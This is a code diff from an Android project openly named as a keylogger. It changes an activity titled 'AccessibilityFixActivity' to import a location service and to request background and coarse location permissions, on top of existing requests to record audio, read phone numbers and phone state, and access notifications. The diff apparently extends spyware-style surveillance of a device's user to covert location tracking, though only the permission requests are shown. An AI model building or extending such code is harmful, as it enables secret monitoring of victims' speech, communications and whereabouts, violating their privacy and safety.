@@ -16,16 +16,21 @@ import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import com.azamovhudstc.androidkeylogger.R
+import com.azamovhudstc.androidkeylogger.service.LocationService
 import com.azamovhudstc.androidkeylogger.service.SvcAccFix
 
 
 class AccessibilityFixActivity : AppCompatActivity() {
     private val REQUEST_CODE_NOTIFICATION_LISTENER = 10
     private val PERMISSION_REQUEST_CODE = 123
+
     @SuppressLint("InlinedApi")
     private val permissions = arrayOf(
         Manifest.permission.RECORD_AUDIO,
         Manifest.permission.READ_PHONE_NUMBERS,
+        Manifest.permission.ACCESS_BACKGROUND_LOCATION,
+
+        Manifest.permission.ACCESS_COARSE_LOCATION,
         Manifest.permission.MODIFY_AUDIO_SETTINGS,
         Manifest.permission.READ_PHONE_STATE,
         Manifest.permission.POST_NOTIFICATIONS,
@@ -94,6 +99,8 @@ class AccessibilityFixActivity : AppCompatActivity() {
         } else {
             startYourService()
         }
+
+
     }
 
     private fun checkNotificationListenerPermission() {
@@ -145,6 +152,8 @@ class AccessibilityFixActivity : AppCompatActivity() {
                     // Permission denied, inform the user and ask to enable from settings
                 }
             }
+
+
         }
     }
 
